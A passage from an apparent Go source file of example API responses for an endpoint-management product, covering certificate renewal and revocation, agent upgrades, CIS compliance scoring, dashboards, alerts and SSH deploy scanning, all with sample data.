		"connection_id": "acc-c005e4174905374fb5116696fb1a4541",
		"kind": "entra",
		"app_id": "95b7c041-e2e7-46ee-a02c-a91d01e998b5",
		"app_name": "Expense reports",
		"cred_type": "client_secret",
		"external_id": "1d65ce0b-59c2-4641-8f99-0db5e3801b65",
		"display_name": "production",
		"expires_at": "2027-04-18T08:55:11Z",
		"rotate_days": 0,
		"renew_days": 30,
		"mode": "download",
		"push_agent_id": "",
		"push_path": "",
		"push_key": "",
		"push_reload": "",
		"grace_days": 7,
		"state": "idle",
		"last_detail": "Renewed at Microsoft Entra ID. The previous one is removed at the provider on 2026-10-27. Download the new one before 2026-10-27.",
		"last_rotated_at": "2026-10-20T08:55:12Z",
		"previous_external_id": "3bfe8017-471c-443d-bf63-f74b6fb2d66c",
		"retire_after": "2026-10-27T08:55:12Z",
		"material_until": "2026-10-27T08:55:12Z",
		"created_by": "jdoe",
		"created_at": "2026-06-02T13:52:06Z"
	}`,
	// Blind spots first: an endpoint that has sent no certificates at all.
	// count is the entries of an endpoint's report: web-01 reports
	// www.example.com twice, at its file and on port 443.
	"GET /api/certificates/coverage": `{
		"coverage": [
			{"agent_id": "agt-a5f17ac9d34a0b8dd362373426b5497f", "hostname": "build-mac-02", "os": "darwin", "count": 0, "reported": false},
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "os": "windows", "count": 1, "reported": true},
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "os": "linux", "count": 4, "reported": true}
		]
	}`,
	// Newest first, without the certificates themselves.
	"GET /api/certificates/issued": `{
		"crl_url": "/pki/mustra-ca.crl",
		"issued": [
			{
				"id": "ci-82492a04fda241e4447cd231950ee682",
				"managed_cert_id": "mc-1be58cde6444d00eea8a21b129b81a37",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"name": "portal.example.com",
				"names": ["portal.example.com", "www.portal.example.com"],
				"cert_path": "/etc/nginx/ssl/portal.example.com.crt",
				"ca": "upload",
				"serial": "e32b466b9592dc80e8713192d73551c5",
				"fingerprint": "7bf09fc8f8d737a5858bd97eb4ae17ac3cd91220533fc563fb385de028489923",
				"issuer": "Sectigo RSA Domain Validation Secure Server CA",
				"not_before": "2026-10-19T00:00:00Z",
				"not_after": "2027-05-06T23:59:59Z",
				"source": "issued",
				"issued_by": "jdoe",
				"issued_at": "2026-10-20T08:52:30Z",
				"status": "active",
				"revocable": false,
				"why_not": "an uploaded certificate is revoked with the authority that issued it",
				"ca_label": "Your own certificate (uploaded)"
			},
			{
				"id": "ci-fb3299c979331553bc758cc3586c5bde",
				"managed_cert_id": "mc-609abf253e18b8bf13685449474e7170",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"name": "www.example.com",
				"names": ["www.example.com"],
				"cert_path": "/etc/nginx/ssl/www.example.com.crt",
				"ca": "private",
				"serial": "4a65c35ea3c515eda5f87151882a3c71",
				"fingerprint": "27e2b9473f560fb164c0be48f6c027cae724628ef5688b3bb5b44678f5258a0d",
				"issuer": "Mustra Private CA",
				"not_before": "2026-08-17T08:31:11Z",
				"not_after": "2027-02-13T09:31:11Z",
				"source": "issued",
				"issued_by": "jdoe",
				"issued_at": "2026-08-17T09:31:12Z",
				"status": "active",
				"revocable": true,
				"ca_label": "Mustra Private CA"
			},
			{
				"id": "ci-bf9da54d3e52f5fb33ef98699f8bd728",
				"managed_cert_id": "mc-609abf253e18b8bf13685449474e7170",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"name": "www.example.com",
				"names": ["www.example.com"],
				"cert_path": "/etc/nginx/ssl/www.example.com.crt",
				"ca": "private",
				"serial": "2bd46c296445b5c3d02f65c4b923f73e",
				"fingerprint": "ac02a97578c91d1e13d4809b20ef58d98552f127c311587f79a8a917b86fde21",
				"issuer": "Mustra Private CA",
				"not_before": "2026-03-18T02:10:04Z",
				"not_after": "2026-09-14T03:10:04Z",
				"source": "issued",
				"issued_by": "jdoe",
				"issued_at": "2026-03-18T03:10:05Z",
				"superseded_at": "2026-08-17T09:31:12Z",
				"status": "expired",
				"revocable": false,
				"why_not": "expired: nothing trusts it any more",
				"ca_label": "Mustra Private CA"
			}
		],
		"reasons": {"cessation_of_operation": 5, "key_compromise": 1, "superseded": 4, "unspecified": 0}
	}`,
	// Replaced first, as the body example asks, then revoked.
	"POST /api/certificates/issued/{id}/revoke": `{
		"detail": "A replacement certificate was installed first. Added to Mustra Private CA's revocation list (/pki/mustra-ca.crl).",
		"ok": true
	}`,
	"GET /api/certificates/managed": `{
		"acme_email": "pki@example.com",
		"acme_staging": false,
		"adcs_agent": "",
		"adcs_config": "",
		"adcs_template": "",
		"cas": ` + certCAsExample + `,
		"cloudflare_token_set": false,
		"managed": [` + wwwManagedCertExample + `, ` + portalManagedCertExample + `],
		"private_ca_ready": true
	}`,
	// The body example as stored when web-01's certificate was first
	// managed: nothing issued yet. With ?issue=1 the state is renewing.
	"POST /api/certificates/managed": `{
		"id": "mc-609abf253e18b8bf13685449474e7170",
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"name": "www.example.com",
		"names": ["www.example.com"],
		"cert_path": "/etc/nginx/ssl/www.example.com.crt",
		"key_path": "/etc/nginx/ssl/www.example.com.key",
		"reload_cmd": "systemctl reload nginx",
		"verify_port": 443,
		"ca": "private",
		"win_bind": "",
		"iis_site": "",
		"renew_days": 30,
		"approval": "approve",
		"enabled": true,
		"state": "idle",
		"last_detail": "",
		"created_by": "jdoe",
		"created_at": "2026-03-18T03:09:51Z"
	}`,
	// Read back after the save, so the history the body cannot change
	// is there.
	"PUT /api/certificates/managed/{id}": wwwManagedCertExample,
	"POST /api/certificates/managed/{id}/renew": `{` + wwwManagedCertFields + `,
		"last_renewed_at": "2026-10-20T08:44:07Z",
		"last_attempt_at": "2026-10-20T08:44:07Z",
		"last_detail": "Issued by Mustra Private CA and installed; valid until 2027-04-18.\nWrote /etc/nginx/ssl/www.example.com.crt and /etc/nginx/ssl/www.example.com.key (backups kept as *.mustra-bak-20261020T084405Z).\nReloaded with: systemctl reload nginx\nVerified: port 443 presents the new certificate.\nfingerprint 0ca174f72a48049799f9b45321db7e75db6641feadc265a4d3451493345bfb06",
		"expires_at": "2027-04-18T08:44:06Z"
	}`,
	"POST /api/certificates/managed/{id}/upload": portalManagedCertExample,
	// Each root Mustra can push, and where it is in the trust store.
	"GET /api/certificates/trust": `{
		"roots": [
			{` + privateRootFields + `,
				"mode": "all",
				` + privateRootEndpointsFields + `
			}
		]
	}`,
	// The list again, after the body example's "off": the root is no
	// longer pushed (mode is empty), and what is installed stays.
	"POST /api/certificates/trust/{id}": `{
		"roots": [
			{` + privateRootFields + `,
				"mode": "",
				` + privateRootEndpointsFields + `
			}
		]
	}`,
	// What the PFX holds, read before anything is installed: chain is
	// how many certificates came with the leaf.
	"POST /api/certificates/upload/preview": `{
		"chain": 1,
		"days_left": 199,
		"issuer": "Sectigo RSA Domain Validation Secure Server CA",
		"names": ["portal.example.com", "www.portal.example.com"],
		"not_after": "2027-05-06T23:59:59Z",
		"subject": "portal.example.com"
	}`,
	"GET /api/certificates/{fingerprint}": `{
		"certificate": {` + wwwCertificateRowFields + `,
			"locations": [
				{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "path": "/etc/nginx/ssl/www.example.com.crt"},
				{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "path": "tls://127.0.0.1:443"}
			]
		}
	}`,

	// clients: web-01 runs under the Web servers profile (ring 2).
	// FIN-LT-0142 has no profile, so it is in ring 1. The other four
	// endpoints a version behind are in ring 0, the deferral ring, which
	// a ring upgrade leaves alone unless asked.
	//
	// Health for ?group= the Pilot group, whose one member is
	// FIN-LT-0142. Every count is over the clients answered.
	"GET /api/clients/health": `{
		"behind": 1,
		"checks": {"agent behind": 1},
		"clients": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"version": "0.57.40",
				"online": true,
				"upgrade_ring": 1,
				"checks": [{"check": "agent behind", "severity": "medium", "detail": "running 0.57.40, server serves 0.57.41"}],
				"drift": []
			}
		],
		"drifted": 0,
		"rings": {"1": {"behind": 1, "total": 1}},
		"serving_version": "0.57.41",
		"total": 1,
		"versions": {"0.57.40": 1}
	}`,
	"GET /api/clients/profiles": `{
		"profiles": [
			{
				"id": "cpf-5b9d1f3a7c2e48e6a0d4b8f2c6e1a3d7",
				"name": "Web servers",
				"description": "Faster reporting for the web tier",
				"priority": 10,
				"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
				"settings": {"sensor_interval_seconds": 60, "log_level": "info", "random_delay_seconds": 30},
				"upgrade_ring": 2,
				"enabled": true,
				"created_by": "jdoe",
				"created_at": "2026-04-08T10:40:16Z",
				"updated_at": "2026-04-08T10:40:16Z",
				"members": 12
			}
		]
	}`,
	// A save pushes the settings at once to the profile's endpoints that
	// run with others; failed names any that refused, by hostname.
	"POST /api/clients/profiles":       `{"failed": {}, "id": "cpf-5b9d1f3a7c2e48e6a0d4b8f2c6e1a3d7", "pushed": 12}`,
	"POST /api/clients/profiles/apply": `{"failed": {}, "pushed": 1}`,
	"PUT /api/clients/profiles/{id}":   `{"failed": {}, "id": "cpf-5b9d1f3a7c2e48e6a0d4b8f2c6e1a3d7", "pushed": 0}`,
	"GET /api/clients/status": `{
		"clients": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"platform": "Microsoft Windows 11 Pro",
				"platform_version": "10.0.26100 Build 26100",
				"arch": "amd64",
				"site": "hq",
				"ips": ["10.40.7.23", "fe80::4c1d:9a2e:7b3f:1c05"],
				"version": "0.57.40",
				"current": false,
				"online": true,
				"first_seen": "2026-05-19T07:58:40Z",
				"last_heartbeat": "2026-10-20T08:42:10Z",
				"last_facts": "2026-10-20T08:31:44Z",
				"transport": "NATS over TLS",
				"settings": {"sensor_interval_seconds": 900, "log_level": "info"},
				"upgrade_ring": 1,
				"drift": []
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"platform": "ubuntu",
				"platform_version": "24.04",
				"arch": "amd64",
				"site": "dc-east",
				"ips": ["10.20.1.11"],
				"version": "0.57.41",
				"current": true,
				"online": true,
				"first_seen": "2026-03-02T14:05:11Z",
				"last_heartbeat": "2026-10-20T08:41:52Z",
				"last_facts": "2026-10-20T08:40:07Z",
				"transport": "NATS over TLS",
				"settings": {"sensor_interval_seconds": 60, "log_level": "info", "random_delay_seconds": 30, "profile": "Web servers"},
				"profile": "Web servers",
				"profile_id": "cpf-5b9d1f3a7c2e48e6a0d4b8f2c6e1a3d7",
				"upgrade_ring": 2,
				"drift": []
			}
		],
		"serving_version": "0.57.41"
	}`,
	// {"ring": 1}: FIN-LT-0142 is the one endpoint in ring 1 that is
	// behind. There is one result per endpoint targeted.
	"POST /api/clients/upgrade": `{
		"results": [
			{"hostname": "FIN-LT-0142", "agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "os": "windows", "from": "0.57.40", "started": true, "detail": "updating to 0.57.41"}
		],
		"serving_version": "0.57.41",
		"started": 1,
		"targets": 1
	}`,

	// compliance: web-01 is scored against an imported CIS benchmark
	// for its Ubuntu release, with the /var/log partition check excepted
	// for the Web servers group, and also runs the built-in policy.
	// FIN-LT-0142 has no Windows benchmark imported, so it has no score.
	"GET /api/compliance/exceptions": `{
		"exceptions": [
			{
				"id": "cex-4d8b2f6a0c1e47e9b3a5c7d9f1e3a5b7",
				"title": "Ensure separate partition exists for /var/log",
				"group_id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3",
				"reason": "Needs a reinstall; planned with the hardware refresh in CHG-1187",
				"expires_at": "2027-04-01T00:00:00Z",
				"created_by": "jdoe",
				"created_at": "2026-10-20T09:02:51Z"
			}
		]
	}`,
	// The exception as stored.
	"POST /api/compliance/exceptions": `{
		"id": "cex-4d8b2f6a0c1e47e9b3a5c7d9f1e3a5b7",
		"title": "Ensure separate partition exists for /var/log",
		"group_id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3",
		"reason": "Needs a reinstall; planned with the hardware refresh in CHG-1187",
		"expires_at": "2027-04-01T00:00:00Z",
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:02:51Z"
	}`,
	"POST /api/compliance/import": `{"checks": 287, "policy_id": "imported-cis-ubuntu-24-04-lts-benchmark-v1-0-0"}`,
	// The list leaves out each policy's checks and gives their count.
	"GET /api/compliance/policies": `{
		"policies": [
			{"id": "imported-cis-ubuntu-24-04-lts-benchmark-v1-0-0", "name": "CIS Ubuntu 24.04 LTS Benchmark v1.0.0", "os": "linux", "source": "imported", "check_count": 287, "created_at": "2026-10-12T15:31:08Z", "created_by": "jdoe"},
			{"id": "builtin-linux-baseline", "name": "Linux baseline (built in)", "os": "linux", "source": "builtin", "check_count": 10, "created_at": "2026-02-11T08:55:02Z", "created_by": "mustra"}
		]
	}`,
	"POST /api/compliance/policies/{id}/run": `{"checks": 10, "endpoints": 31, "policy": "Linux baseline (built in)"}`,
	// Three results on web-01, two policies. The counts are over the
	// results answered. An excepted check keeps its stored result and is
	// shown as excepted. Imported checks have no severity.
	// Two web servers scanned with CIS Debian 12; web-02 still allows
	// root over SSH, so AC-6 fails there. CM-7's check could not be read
	// on either. The Windows benchmark predates mapping, so it is listed.
	"GET /api/compliance/controls": `{
		"framework": "nist_800_53",
		"label": "NIST SP 800-53 Rev. 5",
		"frameworks": [
			{"id": "nist_800_53", "label": "NIST SP 800-53 Rev. 5", "controls": 96},
			{"id": "nist_800_171", "label": "NIST SP 800-171", "controls": 71},
			{"id": "cmmc", "label": "CMMC 2.0", "controls": 71}
		],
		"families": [
			{"id": "AC", "name": "Access Control", "fail": 1, "unknown": 0, "pass": 0, "untested": 0, "controls": [
				{"id": "AC-6", "state": "fail", "endpoints_failing": 1, "endpoints_assessed": 2, "checks": [
					{"policy_id": "imported-cis-debian-12", "policy_name": "CIS Debian 12", "check_id": "35600", "title": "Ensure sshd PermitRootLogin is disabled.", "pass": 1, "fail": 1, "unknown": 0, "excepted": 0}
				]}
			]},
			{"id": "CM", "name": "Configuration Management", "fail": 0, "unknown": 1, "pass": 0, "untested": 0, "controls": [
				{"id": "CM-7", "state": "unknown", "endpoints_failing": 0, "endpoints_assessed": 2, "checks": [
					{"policy_id": "imported-cis-debian-12", "policy_name": "CIS Debian 12", "check_id": "35500", "title": "Ensure /tmp is a separate partition.", "pass": 0, "fail": 0, "unknown": 2, "excepted": 0}
				]}
			]}
		],
		"unmapped_policies": ["CIS Windows Server 2022"],
		"generated_at": "2026-10-30T18:00:00Z"
	}`,
	// Two of the library's entries; Chrome was added to the catalog.
	"GET /api/software-library": `{"items": [
		{"id": "7zip", "name": "7-Zip", "vendor": "Igor Pavlov", "category": "Utilities", "description": "File archiver.",
		 "platforms": ["windows", "linux"], "sources": {"windows": "winget 7zip.7zip", "linux": "apt p7zip-full"}},
		{"id": "google-chrome", "name": "Google Chrome", "vendor": "Google", "category": "Browsers", "description": "Web browser.",
		 "platforms": ["windows", "darwin"], "sources": {"windows": "winget Google.Chrome", "darwin": "Homebrew cask google-chrome"},
		 "package_id": "sw-4c1a8e2f6b9d43e7a5c0f2b8d6e4a1c3"}
	]}`,
	"POST /api/software-library/{id}": `{"package_id": "sw-4c1a8e2f6b9d43e7a5c0f2b8d6e4a1c3", "revision_id": "rev-8f2b6d0a4c1e49e7b3a5c9d1f7e0b2a4"}`,
	"GET /api/compliance/results": `{
		"checks": [
			{"check_id": "35010", "title": "Ensure separate partition exists for /var/log", "severity": "", "pass": 0, "fail": 0, "unknown": 0, "excepted": 1},
			{"check_id": "ssh-password-auth", "title": "SSH password authentication is disabled", "severity": "medium", "pass": 0, "fail": 1, "unknown": 0, "excepted": 0},
			{"check_id": "ssh-root-login", "title": "SSH does not permit direct root login", "severity": "high", "pass": 1, "fail": 0, "unknown": 0, "excepted": 0}
		],
		"endpoints_reporting": 1,
		"results": [
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"policy_id": "imported-cis-ubuntu-24-04-lts-benchmark-v1-0-0",
				"check_id": "35010",
				"title": "Ensure separate partition exists for /var/log",
				"severity": "",
				"state": "excepted",
				"detail": "failed: c:findmnt --kernel /var/log -> r:\\s*/var/log\\s",
				"checked_at": "2026-10-20T02:14:37Z"
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"policy_id": "builtin-linux-baseline",
				"check_id": "ssh-password-auth",
				"title": "SSH password authentication is disabled",
				"severity": "medium",
				"state": "fail",
				"detail": "failed: not f:/etc/ssh/sshd_config; f:/etc/ssh/sshd_config -> r:^\\s*PasswordAuthentication\\s+no",
				"checked_at": "2026-10-20T09:40:22Z"
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"policy_id": "builtin-linux-baseline",
				"check_id": "ssh-root-login",
				"title": "SSH does not permit direct root login",
				"severity": "high",
				"state": "pass",
				"detail": "",
				"checked_at": "2026-10-20T09:40:22Z"
			}
		],
		"states": {"excepted": 1, "fail": 1, "pass": 1, "unknown": 0}
	}`,
	// Benchmarks started, by name, with how many endpoints each scans.
	"POST /api/compliance/scan": `{"benchmarks": {"CIS Ubuntu 24.04 LTS Benchmark v1.0.0": 1}}`,
	// Unscored endpoints come first. The trend is the last 30 days'
	// scores, oldest first.
	"GET /api/compliance/scores": `{
		"auto_scan": "daily",
		"endpoints": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"platform": "Microsoft Windows 11 Pro",
				"exact": false,
				"pass": 0,
				"fail": 0,
				"unknown": 0,
				"excepted": 0,
				"trend": []
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"platform": "ubuntu",
				"policy_id": "imported-cis-ubuntu-24-04-lts-benchmark-v1-0-0",
				"benchmark": "CIS Ubuntu 24.04 LTS Benchmark v1.0.0",
				"exact": true,
				"score": 79.4,
				"pass": 201,
				"fail": 52,
				"unknown": 33,
				"excepted": 1,
				"checked_at": "2026-10-20T02:14:37Z",
				"trend": [76.1, 78.9, 79.4]
			}
		],
		"fleet_score": 79.4,
		"scored": 1
	}`,

	// connect
	"GET /api/connect/exports": `{
		"exports": [
			{` + deploymentsExportFields + `,
				"cursor": "2026-10-19T13:02:44.091372Z",
				"last_run_at": "2026-10-20T07:00:05Z",
				"last_row_count": 0,
				"created_at": "2026-09-15T16:20:48Z",
				"created_by": "jdoe",
				"headers_set": false
			},
			` + siemExportRecord + `
		]
	}`,
	// Just created from the body example, which sends no headers.
	"POST /api/connect/exports": `{` + siemExportFields + `,
		"last_row_count": 0,
		"created_at": "2026-10-06T10:41:27Z",
		"created_by": "jdoe",
		"headers_set": false
	}`,
	// "Run now" on the deployments export: one deployment (the patch
	// run) has started since its cursor, which moves to that run's start.
	"POST /api/connect/exports/{id}/run": `{"cursor": "2026-10-20T07:58:14.318206Z", "rows": 1}`,
	// The body example sends no headers, so the stored ones are kept.
	"PUT /api/connect/exports/{id}": siemExportRecord,

	// content-sets: the Service desk set as the roles example shows it,
	// before the body examples' save adds a dashboard and a saved
	// question. The pickers' choices come with the list: the sensor
	// catalog, every package, dashboard and saved question, each by id
	// and name (an excerpt here, in the list's order).
	"GET /api/content-sets": `{
		"available": {
			"dashboards": [
				{"id": "db-2c8a4e0f6b1d47e9a3c5b7d9f1e3a5c7", "name": "Fleet overview"},
				{"id": "db-64d2472106baa7637afc9e7b7aec4f73", "name": "Web tier posture"}
			],
			"packages": [{"id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "name": "jq"}],
			"questions": [{"id": "sq-4739d2a01d7cbf3af69cb575c57fb394", "name": "Web servers by OS version"}],
			"sensors": [
				{"id": "services", "name": "Services"},
				{"id": "installed_apps", "name": "Installed applications"},
				{"id": "disks", "name": "Disks"}
			]
		},
		"content_sets": [
			{
				` + contentSetServiceDeskHead + `,
				"contents": {"sensors": ["installed_apps", "services", "disks"], "packages": ["sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5"]},
				"created_by": "jdoe",
				"created_at": "2026-03-17T13:20:00Z",
				"updated_at": "2026-06-02T08:41:12Z"
			}
		],
		"kinds": ["sensors", "packages", "dashboards", "questions"]
	}`,
	// A new set, read back as stored.
	"POST /api/content-sets": `{
		` + contentSetServiceDeskHead + `,
		` + contentSetAllKinds + `,
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:40:27Z",
		"updated_at": "2026-10-20T09:40:27Z"
	}`,
	"PUT /api/content-sets/{id}": `{
		` + contentSetServiceDeskHead + `,
		` + contentSetAllKinds + `,
		"created_by": "jdoe",
		"created_at": "2026-03-17T13:20:00Z",
		"updated_at": "2026-10-20T09:40:27Z"
	}`,

	// confidence
	// Scored packages first, lowest score first. jq's attempts are its
	// install on 9 endpoints and the two Sunday updates since; health
	// fell 2 points in the day after, which takes 1 off its 96.3%. Three
	// attempts are too few to score, so Visual Studio Code is unknown
	// and shows only its success rate.
	"GET /api/confidence": `{
		"health_samples": 461237,
		"min_attempts": 8,
		"packages": [
			{
				"package": "jq",
				"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
				"score": 95,
				"band": "high",
				"reason": "26 of 27 attempts succeeded on 9 endpoint(s); health -2.0 in the day after",
				"attempts": 27,
				"succeeded": 26,
				"failed": 1,
				"endpoints": 9,
				"success_pct": 96.29629629629629,
				"health_delta": -2,
				"health_samples": 9,
				"first_seen": "2026-09-30T15:41:02Z",
				"last_seen": "2026-10-18T03:00:05Z"
			},
			{
				"package": "Visual Studio Code",
				"package_id": "sw-2e8a4c0f6b1d49e3a7c5b9d1f3e0a2c4",
				"band": "unknown",
				"reason": "not enough history: 3 of 8 attempts needed before this is worth a number",
				"attempts": 3,
				"succeeded": 3,
				"failed": 0,
				"endpoints": 3,
				"success_pct": 100,
				"health_samples": 3,
				"first_seen": "2026-10-14T10:02:31Z",
				"last_seen": "2026-10-19T13:47:12Z"
			}
		],
		"window_days": 180
	}`,
	// Every patch run in the window, as one answer: 205 of 214 is
	// 95.79…%, and health falling 0.75 takes 0.375 off.
	"GET /api/confidence/patches": `{
		"package": "Patch runs",
		"score": 95,
		"band": "high",
		"reason": "205 of 214 attempts succeeded on 41 endpoint(s); health -0.8 in the day after",
		"attempts": 214,
		"succeeded": 205,
		"failed": 9,
		"endpoints": 41,
		"success_pct": 95.79439252336448,
		"health_delta": -0.75,
		"health_samples": 40,
		"first_seen": "2026-04-23T22:00:09Z",
		"last_seen": "2026-10-20T07:58:14Z"
	}`,

	// dashboard-alerts
	"GET /api/dashboard-alerts": `{
		"alerts": [
			{
				"id": "al-0f6b2d8a4c1e49e7b3a5c9d1f7e2b4a6",
				"name": "Critical vulnerabilities on web servers",
				"dashboard_id": "db-64d2472106baa7637afc9e7b7aec4f73",
				"panel_id": "pn-d39dba1141c3f1330c20d7d5f8fe4406",
				"condition": {"op": "nonzero"},
				"severity": "high",
				"enabled": true,
				"last_value": 3,
				"last_state": "triggered",
				"last_detail": "Critical vulnerabilities on \"Web tier posture\" is 3; alert when count is not zero.",
				"last_evaluated": "2026-10-20T08:40:00Z",
				"created_by": "jdoe",
				"created_at": "2026-09-22T15:47:31Z",
				"updated_at": "2026-09-22T15:47:31Z"
			}
		]
	}`,
	// A save starts evaluating the alerts in the background and reads the
	// alert straight back, so a new one has usually not been evaluated
	// yet: no value, no state.
	"POST /api/dashboard-alerts": `{` + dashboardAlertFields + `,
		"last_state": "",
		"last_detail": "",
		"created_by": "jdoe",
		"created_at": "2026-09-22T15:47:31Z",
		"updated_at": "2026-09-22T15:47:31Z"
	}`,
	// Evaluating now answers with every alert, freshly evaluated: here
	// after the update below.
	"POST /api/dashboard-alerts/evaluate": `{
		"alerts": [
			{` + dashboardAlertFields + `,
				` + dashboardAlertTriggered + `,
				"last_evaluated": "2026-10-20T09:12:31Z",
				"created_by": "jdoe",
				"created_at": "2026-09-22T15:47:31Z",
				"updated_at": "2026-10-20T09:05:12Z"
			}
		]
	}`,
	// An update keeps what the last evaluation recorded until the next.
	"PUT /api/dashboard-alerts/{id}": `{` + dashboardAlertFields + `,
		` + dashboardAlertTriggered + `,
		"last_evaluated": "2026-10-20T08:40:00Z",
		"created_by": "jdoe",
		"created_at": "2026-09-22T15:47:31Z",
		"updated_at": "2026-10-20T09:05:12Z"
	}`,

	// dashboards
	// Two of the caller's dashboards: Fleet overview, which a fresh
	// install seeds (with Security posture, left out here), and the body
	// examples' Web tier posture. Then the saved queries a panel may
	// read, and the catalog of sources every panel draws from.
	"GET /api/dashboards": `{
		"can_manage_alerts": false,
		"dashboards": [
			{"created_by": "mustra", "description": "Who is out there and what they run.", "editable": false, "id": "db-2c8a4e0f6b1d47e9a3c5b7d9f1e3a5c7", "name": "Fleet overview", "panel_count": 6, "shared": true, "updated_at": "2026-03-02T13:58:20Z"},
			{"created_by": "jdoe", "description": "Platforms and open vulnerabilities on the web servers", "editable": true, "id": "db-64d2472106baa7637afc9e7b7aec4f73", "name": "Web tier posture", "panel_count": 2, "shared": true, "updated_at": "2026-09-22T15:40:52Z"}
		],
		"questions": [
			{
				"id": "sq-4739d2a01d7cbf3af69cb575c57fb394",
				"name": "Web servers by OS version",
				"description": "Linux endpoints running nginx, counted by OS version",
				"get": ["platform_version"],
				"where": [{"op": "equals", "field": "os", "value": "linux"}, {"op": "equals", "field": "services.name", "value": "nginx"}],
				"match_all": true,
				"created_at": "2026-09-15T11:20:04Z",
				"created_by": "jdoe"
			}
		],
		"sources": ` + reportSourcesExcerpt + `
	}`,
	"POST /api/dashboards": `{` + webTierDashboardFields + `, "updated_at": "2026-09-22T15:31:08Z"}`,
	// The endpoints source's columns, sorted: the endpoint fields, then
	// one attr_ column per asset attribute.
	"GET /api/dashboards/columns": `{
		"columns": ["agent_id", "agent_version", "arch", "attr_cost_centre", "attr_owner", "hostname", "ips", "last_seen", "managed", "online", "os", "platform", "platform_version", "retired_at", "site"],
		"rows": 42
	}`,
	// An unsaved panel gets an id of its own, which a save does not keep.
	"POST /api/dashboards/preview": `{"id": "pn-7a3e9c1f5b2d48e6a0c4f8b2d6e1a9c3", ` + platformPanelDataFields + `}`,
	"GET /api/dashboards/{id}":     `{"dashboard": {` + webTierDashboardFields + `, "updated_at": "2026-09-22T15:40:52Z"}, "editable": true}`,
	"PUT /api/dashboards/{id}":     `{` + webTierDashboardFields + `, "updated_at": "2026-09-22T15:40:52Z"}`,
	// A private copy for the caller, with new panel ids: the original's
	// alerts and history stay with it.
	"POST /api/dashboards/{id}/clone": `{
		"id": "db-9e1c5a7f3b2d48e6a0c4b8d2f6e1a3c5",
		"name": "Web tier posture (copy)",
		` + webTierDescription + `,
		"panels": [
			{"id": "pn-3b7f1d9a5c2e48b6a0d4e8c2f6b1a9d3", ` + platformPanelDef + `},
			{"id": "pn-c5a9e3f7b1d24e86a0c4b8d2e6f1a3c9", ` + criticalPanelDef + `}
		],
		"panel_count": 2,
		"shared": false,
		"created_by": "jdoe",
		"created_at": "2026-10-20T08:47:13Z",
		"updated_at": "2026-10-20T08:47:13Z"
	}`,
	// The critical-vulnerabilities panel holds its highlight: the three
	// findings its alert counts.
	"GET /api/dashboards/{id}/data": `{
		"description": "Platforms and open vulnerabilities on the web servers",
		"editable": true,
		"generated_at": "2026-10-20T08:42:31Z",
		"highlighted": 1,
		"id": "db-64d2472106baa7637afc9e7b7aec4f73",
		"name": "Web tier posture",
		"panels": [
			{"id": "pn-ff888df99f1c427a9cfa7bd1fde8e70f", ` + platformPanelDataFields + `},
			{
				"id": "pn-d39dba1141c3f1330c20d7d5f8fe4406",
				"chart": "number",
				"title": "Critical vulnerabilities",
				"count": 3,
				"total": 3,
				"highlight": true,
				"width": 1,
				"source": "findings",
				"filter_column": "severity",
				"filter_value": "critical"
			}
		]
	}`,

	// deploy
	// The subnet is guessed from the agents' NATS address, so it is the
	// one web-01 is on; web-01 is matched to its agent by IP. A scan
	// lists only the hosts with SSH open, each with its PTR name, if any.
	"POST /api/deploy/autoscan": `{
		"cidr": "10.20.1.0/24",
		"results": [
			{"ip": "10.20.1.11", "ssh_open": true, "hostname": "web-01.corp.example.com", "agent_installed": true, "agent_version": "0.57.41"},
			{"ip": "10.20.1.14", "ssh_open": true, "hostname": "web-04.corp.example.com", "agent_installed": false}
		]
	}`,
	// Metadata only: the secrets themselves are never sent.
	"GET /api/deploy/credentials": `{
		"credentials": [
			{"id": "cred-ec987fc368dc0f4a5cc17d6a3bbfd96b", "name": "Linux deploy key", "username": "mustra-deploy", "auth_type": "private_key", "created_at": "2026-10-16T10:58:31Z", "created_by": "jdoe"},
			{"id": "cred-8815bbecafd84ca4bc6f3d7deaa8425d", "name": "Package mirror", "username": "svc-mustra", "auth_type": "password", "created_at": "2026-08-11T10:12:05Z", "created_by": "jdoe"}
		]
	}`,
